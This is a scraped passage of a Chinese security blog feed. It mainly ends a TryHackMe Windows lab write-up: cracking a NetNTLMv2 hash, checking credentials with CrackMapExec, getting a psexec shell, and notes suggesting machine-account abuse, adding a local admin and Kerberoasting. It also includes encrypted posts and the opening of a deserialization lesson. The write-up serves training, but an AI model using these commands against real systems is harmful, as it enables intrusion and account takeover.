class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(sid㉿kali)-[~/Documents/flags/tryhackme/ra]</span><br><span class="line">└─$ echo &quot;buse::WINDCORP:581eb034fb28c39c:54A0D21F2C7F9C9FC662887D404ADBE6:01010000000000003016F4F0AEBAD6019F1E18DD6C6FF8DD00000000020006005300</span><br><span class="line">4D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C00030028007300650072007600650072003200300</span><br><span class="line">0300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000D06AF3C0BE</span><br><span class="line">5C4909A34ED0E1314D4F4E9E879FB75EC17102D80D7E32C45E88740A00100000000000000000000000000000000000090000000000000000000000&quot; &gt; hash</span><br><span class="line">                                                                                                                                     </span><br><span class="line">┌──(sid㉿kali)-[~/Documents/flags/tryhackme/ra]</span><br><span class="line">└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">uzunLM+3131      (buse)</span><br></pre></td></tr></table></figure><p>利用<code>crackmapexec</code> 凭据验证</p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205004009.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205004009.png" alt="image.png"></a><br>crackmapexec 中 Pwn3d！对于 WinRM，这意味着我们可以使用 Evil-WinRM 来进入盒子。</p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205004222.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205004222.png" alt="image.png"></a></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先，我们检查 buse 用户属于哪些组，以及我们是否有任何特殊权限。</p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205004846.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205004846.png" alt="image.png"></a></p><p>我们看到我们是 Account Operators 组的一部分，这意味着我们可以修改除 admin 帐户之外的所有帐户。然后在检查不同的目录时，我们找到一个 scripts 目录，其中包含一个 checkservers.ps1 powershell 脚本，它告诉我们“C：\Users\brittanycr\hosts.txt”正在自动运行&#x2F;使用。终会读取每一行并通过Invoke-Expression执行</p><p>由于我们是 Account Operators 组的一部分，因此让我们重置帐户 “brittanycr” 的密码</p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205005549.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205005549.png" alt="image.png"></a></p><p>看来我们不能把 psexec 或 winrm 作为 brittanycr 放进盒子里。让我们使用 smbclient 来放置我们的恶意hosts.txt文件。</p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205005845.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205005845.png" alt="image.png"></a></p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205010316.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205010316.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(sid㉿kali)-[~/Documents/flags/tryhackme/ra]</span><br><span class="line">└─$ crackmapexec smb windcorp.thm -u sid -p &#x27;hello!123&#x27;</span><br><span class="line">SMB         10.10.226.131   445    FIRE             [*] Windows 10.0 Build 17763 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.226.131   445    FIRE             [+] windcorp.thm\sid:hello!123 (Pwn3d!)</span><br><span class="line">                                                                                                                                     </span><br><span class="line">┌──(sid㉿kali)-[~/Documents/flags/tryhackme/ra]</span><br><span class="line">└─$ python3 /usr/share/doc/python3-impacket/examples/psexec.py  sid@windcorp.thm          </span><br><span class="line">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Requesting shares on windcorp.thm.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file cfKhdeUq.exe</span><br><span class="line">[*] Opening SVCManager on windcorp.thm.....</span><br><span class="line">[*] Creating service TNal on windcorp.thm.....</span><br><span class="line">[*] Starting service TNal.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1158]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line">C:\Windows\system32&gt;cd c:\users\Administrator\Desktop</span><br><span class="line"> </span><br><span class="line">c:\Users\Administrator\Desktop&gt;dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 84E1-0562</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">05/10/2020  03:17 AM    &lt;DIR&gt;          .</span><br><span class="line">05/10/2020  03:17 AM    &lt;DIR&gt;          ..</span><br><span class="line">05/07/2020  12:22 AM                47 Flag3.txt</span><br><span class="line">               1 File(s)             47 bytes</span><br><span class="line">               2 Dir(s)  44,605,804,544 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users\Administrator\Desktop&gt;type &quot;Flag3.txt&quot;</span><br><span class="line">THM&#123;ba3a2bff2e******************************&#125;</span><br><span class="line"></span><br><span class="line">c:\Users\Administrator\Desktop&gt;</span><br></pre></td></tr></table></figure><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="1-检查-WinRM-服务是否启用"><a href="#1-检查-WinRM-服务是否启用" class="headerlink" title="1. 检查 WinRM 服务是否启用"></a><strong>1. 检查 WinRM 服务是否启用</strong></h3><p>使用工具如 <strong>CrackMapExec</strong> 或 <strong>Nmap</strong> 来检测目标系统是否开启 WinRM 服务。</p><h4 id="1-1-使用-CrackMapExec"><a href="#1-1-使用-CrackMapExec" class="headerlink" title="1.1 使用 CrackMapExec"></a><strong>1.1 使用 CrackMapExec</strong></h4><p>bash</p><p>复制代码</p><p><code>crackmapexec winrm &lt;target-ip&gt; -u &lt;username&gt; -p &lt;password&gt;</code></p><ul><li>如果输出中显示 **<code>[+]</code>**，说明凭据有效且 WinRM 可用。</li><li>如果显示 **<code>[-]</code>**，可能是凭据无效或服务未启用。</li></ul><h4 id="1-2-使用-Nmap"><a href="#1-2-使用-Nmap" class="headerlink" title="1.2 使用 Nmap"></a><strong>1.2 使用 Nmap</strong></h4><p>扫描端口 5985（HTTP）和 5986（HTTPS），它们是 WinRM 默认使用的端口：</p><p>bash</p><p>复制代码</p><p><code>nmap -p 5985,5986 &lt;target-ip&gt;</code></p><ul><li>如果显示端口开放，说明 WinRM 可能正在运行。</li></ul><hr><h3 id="2-验证-WinRM-服务的响应"><a href="#2-验证-WinRM-服务的响应" class="headerlink" title="2. 验证 WinRM 服务的响应"></a><strong>2. 验证 WinRM 服务的响应</strong></h3><p>使用工具如 <strong>Evil-WinRM</strong>、<strong>CrackMapExec</strong> 或 <strong>Python 脚本</strong>来验证服务和凭据。</p><h4 id="2-1-使用-Evil-WinRM"><a href="#2-1-使用-Evil-WinRM" class="headerlink" title="2.1 使用 Evil-WinRM"></a><strong>2.1 使用 Evil-WinRM</strong></h4><p>安装 <strong>Evil-WinRM</strong>：</p><p>bash</p><p>复制代码</p><p><code>sudo gem install evil-winrm</code></p><p>验证目标：</p><p>bash</p><p>复制代码</p><p><code>evil-winrm -i &lt;target-ip&gt; -u &lt;username&gt; -p &lt;password&gt;</code></p><ul><li>成功连接后，你将进入目标系统的交互式 PowerShell 环境。</li><li>如果失败，检查服务是否正常运行或凭据是否有效。</li></ul><h4 id="2-2-使用-CrackMapExec"><a href="#2-2-使用-CrackMapExec" class="headerlink" title="2.2 使用 CrackMapExec"></a><strong>2.2 使用 CrackMapExec</strong></h4><p>bash</p><p>复制代码</p><p><code>crackmapexec winrm &lt;target-ip&gt; -u &lt;username&gt; -p &lt;password&gt;</code></p><ul><li>显示 <strong><code>Pwn3d!</code></strong> 表示凭据有效并且具有管理员权限</li></ul><h2 id="2-CrackMapExec的作用"><a href="#2-CrackMapExec的作用" class="headerlink" title="2. CrackMapExec的作用"></a>2. <code>CrackMapExec</code>的作用</h2><ol><li><p><strong>用户凭据验证</strong></p><ul><li>检查目标网络中某个用户凭据是否有效。</li><li>支持多种身份验证方式（明文密码、哈希、Kerberos票据等）。</li></ul></li><li><p><strong>共享文件和目录枚举</strong></p><ul><li>枚举共享资源。</li><li>下载或上传文件到目标系统的共享目录。</li></ul></li><li><p><strong>命令执行</strong></p><ul><li>在目标机器上远程执行命令（需要管理员权限）。</li><li>支持多种协议如 WinRM、SMB。</li></ul></li><li><p><strong>凭据提取</strong></p><ul><li>使用 Mimikatz 从目标提取用户凭据或哈希值。</li></ul></li><li><p><strong>Active Directory 集成</strong></p><ul><li>枚举域用户、域组和域计算机信息。</li><li>针对 Active Directory 的攻击（如 Kerberos 金票&#x2F;银票、DC Sync 攻击等）。</li></ul></li><li><p><strong>自动化攻击</strong></p><ul><li>支持自动化 lateral movement（横向移动）。</li><li>支持多目标批量操作。</li></ul></li></ol><h2 id="分析whoami"><a href="#分析whoami" class="headerlink" title="分析whoami"></a>分析whoami</h2><p>通过 <code>whoami /all</code> 的输出，我们可以提取和分析与用户权限、组成员身份以及特权相关的信息，以判断用户在目标系统上的能力以及潜在的攻击面。以下是详细的分析：</p><hr><h3 id="1-用户信息"><a href="#1-用户信息" class="headerlink" title="1. 用户信息"></a><strong>1. 用户信息</strong></h3><ul><li><strong>用户名</strong>: <code>windcorp\buse</code><ul><li>表示用户 <code>buse</code> 在域 <code>windcorp</code> 中。</li></ul></li><li><strong>SID</strong>: <code>S-1-5-21-555431066-3599073733-176599750-5777</code><ul><li>安全标识符，唯一标识该用户。</li><li>SID 的结构表明此用户是域用户，而非本地用户。</li></ul></li></ul><hr><h3 id="2-组信息"><a href="#2-组信息" class="headerlink" title="2. 组信息"></a><strong>2. 组信息</strong></h3><p>用户属于多个组，其中一些组提供了有用的信息：</p><h4 id="关键组分析"><a href="#关键组分析" class="headerlink" title="关键组分析"></a><strong>关键组分析</strong></h4><ol><li><p><strong><code>BUILTIN\Account Operators</code></strong></p><ul><li><strong>高权限组</strong>：此组的成员通常有能力管理账户，包括创建或修改用户账户。</li><li><strong>潜在利用点</strong>：可以检查是否能创建一个高权限用户（如域管理员）。</li></ul></li><li><p><strong><code>BUILTIN\Remote Desktop Users</code></strong></p><ul><li>用户属于远程桌面组，说明此用户可以通过 RDP 访问目标系统。</li><li><strong>潜在利用点</strong>：尝试使用 RDP 连接并获取更高权限的访问。</li></ul></li><li><p><strong><code>BUILTIN\Remote Management Users</code></strong></p><ul><li>此组成员默认可以通过 WinRM 远程访问系统。</li><li><strong>已验证</strong>：通过 Evil-WinRM 成功登录确认。</li></ul></li><li><p><strong><code>WINDCORP\IT</code></strong></p><ul><li>自定义组，可能赋予 IT 相关权限。</li><li><strong>潜在利用点</strong>：查询此组的特权，判断是否有管理功能。</li></ul></li></ol><hr><h3 id="3-权限信息"><a href="#3-权限信息" class="headerlink" title="3. 权限信息"></a><strong>3. 权限信息</strong></h3><p>用户当前拥有以下权限：</p><h4 id="关键权限分析"><a href="#关键权限分析" class="headerlink" title="关键权限分析"></a><strong>关键权限分析</strong></h4><ol><li><p><strong><code>SeMachineAccountPrivilege</code></strong></p><ul><li><strong>描述</strong>: 允许用户将工作站加入域。</li><li><strong>潜在利用点</strong>:<ul><li>可以滥用此权限在域中创建计算机对象。</li><li>借助工具（如 <strong>PowerMad</strong> 或 <strong>AD Module</strong>）创建恶意机器账户，并使用相关的 SPN 进一步执行 Kerberos 票据攻击（如 <strong>Kerberoasting</strong>）。</li></ul></li></ul></li><li><p><strong><code>SeChangeNotifyPrivilege</code></strong></p><ul><li><strong>描述</strong>: 允许用户绕过文件和目录的遍历检查。</li><li><strong>攻击意义</strong>: 这是普通权限，对攻击意义不大。</li></ul></li><li><p><strong><code>SeIncreaseWorkingSetPrivilege</code></strong></p><ul><li><strong>描述</strong>: 允许用户调整进程的工作集大小。</li><li><strong>攻击意义</strong>: 通常与内存管理有关，对攻击用途有限。</li></ul></li></ol><hr><h3 id="4-动态访问控制"><a href="#4-动态访问控制" class="headerlink" title="4. 动态访问控制"></a><strong>4. 动态访问控制</strong></h3><ul><li><strong><code>Kerberos support for Dynamic Access Control on this device has been disabled.</code></strong><ul><li><strong>描述</strong>: 目标设备不支持基于动态访问控制（DAC）的 Kerberos 身份验证。</li><li><strong>攻击意义</strong>: 这不会直接影响你的渗透，但表明目标系统的安全配置可能较老。</li></ul></li></ul><hr><h3 id="5-攻击面与利用建议"><a href="#5-攻击面与利用建议" class="headerlink" title="5. 攻击面与利用建议"></a><strong>5. 攻击面与利用建议</strong></h3><p>根据当前信息，你可以尝试以下攻击：</p><h4 id="利用现有特权"><a href="#利用现有特权" class="headerlink" title="利用现有特权"></a><strong>利用现有特权</strong></h4><ol><li><p><strong>机器账户攻击</strong></p><ul><li><p>滥用 <code>SeMachineAccountPrivilege</code> 创建一个恶意的计算机对象。</p></li><li><p>示例命令（使用 PowerMad 模块）：</p><p>  powershell</p><p>  复制代码</p><p>  <code>Import-Module PowerMad New-MachineAccount -MachineAccount EvilMachine -Password $(ConvertTo-SecureString &#39;P@ssw0rd123!&#39; -AsPlainText -Force)</code></p></li><li><p>然后使用 Kerberos 票据进一步攻击（如 Golden&#x2F;Silver Ticket）。</p></li></ul></li><li><p><strong>RDP 登录</strong></p><ul><li><p>用户属于 <code>Remote Desktop Users</code>，尝试使用 RDP 登录目标系统以获得 GUI 访问。</p></li><li><p>RDP 工具：</p><p>  bash</p><p>  复制代码</p><p>  <code>xfreerdp /u:buse /p:&#39;uzunLM+3131&#39; /v:&lt;target-ip&gt;</code></p></li></ul></li></ol><h4 id="探索更高权限"><a href="#探索更高权限" class="headerlink" title="探索更高权限"></a><strong>探索更高权限</strong></h4><ol start="3"><li><p><strong>账户操作</strong></p><ul><li><p>利用 <code>Account Operators</code> 权限，尝试创建新账户或修改现有账户。</p></li><li><p>创建本地管理员账户的 PowerShell 示例：</p><p>  powershell</p><p>  复制代码</p><p>  <code>net user admin2 Password123! /add net localgroup administrators admin2 /add</code></p></li></ul></li><li><p><strong>枚举域信息</strong></p><ul><li><p>使用 PowerShell 或 CrackMapExec 枚举域中的用户、组和计算机：</p><p>  bash</p><p>  复制代码</p><p>  <code>crackmapexec smb &lt;target-ip&gt; -u buse -p &#39;uzunLM+3131&#39; --shares crackmapexec ldap &lt;target-ip&gt; -u buse -p &#39;uzunLM+3131&#39; --users</code></p></li></ul></li><li><p><strong>尝试 Kerberoasting</strong></p><ul><li>如果域中存在带有 SPN 的服务账户，尝试执行 Kerberoasting 攻击，提取可破解的 Kerberos 票据。</li></ul></li></ol><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul><li><strong>当前用户具有一定权限，但并非管理员</strong>。</li><li>可以尝试滥用 <code>SeMachineAccountPrivilege</code> 和 <code>Account Operators</code> 权限提升攻击范围。</li><li>使用 Evil-WinRM 和 CrackMapExec 进一步枚举目标系统和域的详细信息。</li></ul><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> #Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Certified</title>
      <link href="/2024/12/04/HTB-Certified/"/>
      <url>/2024/12/04/HTB-Certified/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="8f7216e592f6b593e7437f19ec6ccc0c358eaf4df8c4da621fd756888bba12ed">7e8ec9cd4c38bd473ca2a20166522c3145fd1c8b18a1721263762d0215eb3f1a9e2f6583f81442cc48e4401935055f45e980a558d96e301c1d2cf7e701baaff41d92c08432e7b27405813252b7fa63f42d6601b18680ec8cb8c3cdde5eeac9cc1fab36494d3e026ad10b3dbf2435f3a644f0d10579b32e61ac09e2b0bbf3e8b9c3415bec1ef5e0d7b76ec542d8f30fa55b95ab194bbf2fad607064f7a5529ae6fd6e06a86504be6e6d2e7782191f2596cfa05d5c23a0f4608234a2ac5d4a269982f835407719b76a076bdb08aa9b76ab948607a5fdba5e7da14f5e975ecd50101a9e2712642a5f3784eea922c129e7eee76e8ac4153bf703eec04af192241d2e173f016287ccc108a288bf6e06756864b086b904b960a3b718f3b88b132af5cd55d08423b0bf332917388e0a809701bcd7c42a6e882ce407da57e0ce2ba0f646f7ab6e7925be22e9f7603b8a921372ec63a9226d6c4761dd4c39f70e3d1cce5ccb3611192f41a13e01303938cf6ae3a4348ab7221ebc219199566eca68554b9d31c6b61ab9c561f4495d2730332ff56ee3556e4e7090304a6f57c57d9d01cc3869f8d5e153679dbd69753070b96c0ef47cab9d4cf38bd6db69840b072af97f003279b36816dbc87743d2bf78ea985c4763b54cfd8ce732655d56d82d9732af12a8cdb63e0d6c52eb88e95483efad03c6b41df61f55e93f0fe54640f49ef26b8f2d8ba6da33989fa849772224e6745b3c05eb8cdd2eab0345d3442238878c968cef59f023e7ade6500ba24770bdee3252e8c450a737768300ac3b6c6cd49adbeec3f23767a958ae58685c8fa23e689bb4491108325ef2c56089a3c0f1a0c5c4727db275ca21772918a3a560f88b9aa128741149aa591ac7fc6a0b5c1f48621ec05e7ec025c2cd309157ee7b7bb5fcc022df7b559a96d7f1a42ece9bfc4afe5d670f8ef29a651e8116e17831b758b70c14cad81d33bafb233c1379dbd2556caed7e0c46024fc96dd22916aa1439b4fabdae49b0ae7939262f8ab79769ef249892f2db64646dcfee7899868d9efb46da9b0677ecb6298584e0ac130eafc48a16388912038cd99e1acdbf29c60940acd7a7e21383d9a1b7dcfb21d960eeee4ec987e6152184a20380772c2decbb45c3b874e34c3551c96dc6c102080a68a34555a4352decfc62e1e3ae7f31b66ab1c7c85390809abab550dc95b3f638edf6fc1975492074604ca382bfdd13ee38b143f2c9590a92d43af646c15a9a527b414ecdad50a1dbf06c4ff9ca67d56f53aa7d54b5c54316fb106744bf9da8d9435cb52e08be3e5f90813fd1ffbd958455969bfac18707f4fa2742290867742d77f7034b9dade87e6aedc916b812567e2e885a6236243313d5fab23c816071273505d3d676a7510b5c80749f47c6b82af0af7c63fc303c49445706fc0c575aa0aa2bf6ca8ae9aa80b2c49bb5d8675709f63b029dafd767b5c607c40a22798c88c8705d7c4fc06d364cf75d87522adf4c09d56fe4d2191a91fa95148f7c76d65f3fc99c628296e0d8a1a7e13ae774c806d4fc779bf438badae935c431ca2fa93d87807f96715965a47510eda0fe2e8909145a7260b4a9a369b973d5935917955ffd27b72b4a29d28a7f5097d833f25a1274317258eb4cf3ced970f1f9548f937f079e8f7c120f718f549a4fcfcb62f0b7c2b66014066a0ecd0d7c0500c954d19e0fe59e086d4a1f3feff781e71d1378e6a26db91f7eb77982add07bd648c3f3ddeba02c518688676648bc5642a386a21e9a902ccbf9ca165af14256afcc924da0554ea37da098c16da10352e3d89169c3063f47b1f59d08acb0a5da7d5c0216e2e1712a54051e2395b35558d8535000ce69f3c29375297d1d1a2ea14d9cea74a0838e1b8b7964f3c0d65130530e6f4f623d2ae5f62eaa219dcaf15ef65767f0448b27b199a575bfa570bf45c890b801dd64d5a4442f32fc5546911add9d5da028c2aef8d829178eefbb93340030abb4b50c37b9dfcd498cb528c1993f89a742a47a29bf2b305481c0884d16a38a45f5e4e49fdeabe66c184bdd0331a4abcf4a70850dd2e231444f7ec8ab3ee2eea16a52c892264cd8c56c5366b6fb3762324e623e511c6cd05209b7cecbae943d876ea94e8181cbe5faf03caf2db668a6386d9df2f36c6a0f9df7c2a6ce765497e676dcb7e9134d531cd9a7b32f9b558d7cb7811cde9fab7c894eb1b260c30302090c8136e3cf716d341d5850ceb500886ba869c52ea84d3874d3630bc599fc4ec23ea9ea8558a60f5543f9c6246b5813ddaa2f10e591d5b78c928ba769c47165083e1b69d409332b5</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何进行信息搜集</title>
      <link href="/2024/12/04/how_to_info_gather/"/>
      <url>/2024/12/04/how_to_info_gather/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="5a344327ec7d8a410c00c6ec709e55079397be3b91901f33f7fe83ffc5761c2b">7e8ec9cd4c38bd473ca2a20166522c3145fd1c8b18a1721263762d0215eb3f1a9e2f6583f81442cc48e4401935055f45e980a558d96e301c1d2cf7e701baaff41d92c08432e7b27405813252b7fa63f42d6601b18680ec8cb8c3cdde5eeac9cc1fab36494d3e026ad10b3dbf2435f3a644f0d10579b32e61ac09e2b0bbf3e8b9c3415bec1ef5e0d7b76ec542d8f30fa55b95ab194bbf2fad607064f7a5529ae6fd6e06a86504be6e6d2e7782191f259686e6fc3261c47ce3bb093cbeb378c45882852e6f45615214c0aeec33fde3877dd3cc03b5f864c6a62d20b2a5ffd03616798c4c970f04d9f3bb1b15f58c8b475a12f850724e6fd3621422f676d8ea82a7889c1373778364bd2ce16a6417a62da01fdb53d373d55705a3d63783705868f6051acad18c72c02bdbac634cd1546ddeb1c0a8ab986413cdf624e2ef6ac29e7caa2f18995eb4324a55cb9792c5403eaadca5a37ea48bf90ff04256e3e84660edd50bb6b6a9154276dd0d583bd9dc9ec285cbc12e9198ca4a8f78fddabf92dd7086bdab3d4215de70e94e267a6fa055f65564361f56e0955a11c4d9fc96c4159d232440cd5460649c52df74261f9e45744212cc665197c5cbc76288697d41b6a93a036f6797a677230417a8dfe964b08e4e3a4becd86990e984179b1d32a1d38108c43079b3c5c857bf26a3f719501c5a714604fe983ea8900e1e8513dac260e912bf4aa69dfe73042a3e6e3a56db201c679b472a39cb13a081680224a5e2cc83ebd00b559f15291855e249d4d8b27510aaf54b21a854b110e2f827e43a189f24fe2a5adc9a39828db824a4af9d10dafaa65749c3363f74c9f10cd7d53a5f92b5101d1099a0321d93c57e610b11e4d4701482da530e58f14096498d3f04c52829fd967f030a4cc7c54bb5d0cbe53c4457836ab4146466c7d047ff7d4ccb384ab082874600c5bd87bf6e65044a8460f0eb382c673106f4a5266bfe5240bc51af0e0a68c9240efac11fab7f586991ba7ea9239a220f3d1954223ffd15458bf7ed078a5dae1a9f96f68d90d1f94dc96724abceffb5600c2d6cd4c093fa27079a2bf2b36e5fb89ed965f077268acefc9ad2a9ed0ce76a07b1643c6ebb1522edc0d48dc2cfd1e6f8911f9eda6a1906c92a9713880ae2b4bdb7140c0ddd853b051e83245d034fcba91e1ead50371f87fb43007312ad854da4a2a174107a1e094a799c334c7153155bf64c403008ac3bf8e47c73dbe8027e96424b6d781b92f1fd16b51dfec36dafd44b8a428211cc3e5e1b0a97e002fa60adaa67772d749c363db187078a7d1d5fe5a9087a70d2c611b105e7f46f08bf86b22e4c38b22ef9eb039ee7095d39dc29881f957534fea777be133634fb467520df30bfa72379b216a8917c32197e1048a74b27569cb0a1d5bacbb3715d098c61e5a88c4659c3a5eb6e7ce6a4ad79d011b9c80926899776891c652532ac1c11cf9e26cbc8639a4f3c8f7723ff85740e6af238ec11f4b610302b08569965998ff7504b99c9a1ee9eb8eb3490e44782833adb029991480da54d4667b22cdc050f1bc490b70d20b1d4753607bfab0acbc5902c1ac0140c53decc9a03899eb9176d3278da96def7c19238e155fdb9926c126721aba3650c10df60d585c2a5479a70920eca352eb218c3f096116e9f08c277564544a04c15aa4584eb8a8af1e1c471d819d45738942ba9aa1fa3ddf431351325c587625a189c6f696f5fe79ddafcc438990f1f596c507f7331c60067fdbd9990d30ea0c547dbd83a02e3bbd0a3fb39bd9e49cdf5d8a228ed0f9a82423c4d020519ef41af751040d5c8b55b915c3148d900641bbaad8a31adbe436400c638e002fd2a5957aef3500c25271a8624f86082feaff658817fa4825129e6082013f20579aaf0f6826f4fbf2e131c093b9a158cf3bbe6680ce6d48f11ac8e2ccec3bbe5838140e3b2935a73ac2c3766d541588a074f6e2cfd106450d7119bbd</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不安全的反序列化</title>
      <link href="/2024/12/03/insecuredeserialisation/"/>
      <url>/2024/12/03/insecuredeserialisation/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote></blockquote><h2 id="靶场概述"><a href="#靶场概述" class="headerlink" title="靶场概述"></a>靶场概述</h2><p>难度：<br>描述：</p><hr><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td></td></tr><tr><td>OS</td><td>kali</td><td></td></tr></tbody></table><hr><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>用户提供的输入一直是漏洞的催化剂，在众多平台和应用程序中构成持续威胁。利用用户输入（从 SQL 注入到跨站点脚本）是保护 Web 应用程序的一个众所周知的挑战。另一个与用户输入相关的不太为人知但同样危险的漏洞是<strong>不安全的反序列化</strong>。  </p><p>当应用程序足够信任序列化数据以使用它而不验证其真实性时，就会发生不安全的反序列化漏洞。这种信任可能会导致灾难性的后果，因为攻击者会操纵序列化对象来实现远程代码执行、提升权限或发起拒绝服务攻击。这种类型的漏洞在各种编程环境（如 Java、.NET 和 PHP）中序列化和反序列化复杂数据结构的应用程序中普遍存在，这些环境通常使用序列化进行远程过程调用、会话管理等。  </p><p>学习目标</p><p>在整个课程中，您将全面了解以下关键概念：</p><ul><li><p>序列化和反序列化过程的工作原理  </p></li><li><p>Web 应用程序的潜在风险</p></li><li><p>开发技术</p></li><li><p>缓解措施</p></li></ul><p>学习先决条件</p><p>在开始聊天室之前，建议了解以下主题：</p><ul><li><a href="https://tryhackme.com/room/howwebsiteswork">网站如何运作</a></li><li><a href="https://tryhackme.com/room/protocolsandservers">协议和服务器</a></li><li><a href="https://tryhackme.com/room/owasptop10">OWASP 公司前 10 名</a></li></ul><p>连接到本机</p><p>您可以通过单击此任务中附带的按钮来启动虚拟机。我们稍后在会议室中使用易受攻击的应用程序来实际执行练习并熟悉各种攻击媒介。请在系统完全启动后等待 1-2 分钟，以让自动脚本成功运行。</p><p>让我们开始吧！</p><h2 id="一些重要概念"><a href="#一些重要概念" class="headerlink" title="一些重要概念"></a>一些重要概念</h2><p>在详细讨论不安全反序列化之前，通过一个简单的例子来理解基本概念是至关重要的。  </p><p>序列化</p><p>想想序列化，就像早上收拾书包一样。你有书、笔记本、午餐盒和水瓶，你需要把它们整理进包里。序列化就像获取不同的信息（如笔记）并将它们放在一起，以便于存储或发送给朋友。<br><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241203175326.png" title="image.png" class="gallery-item"><img 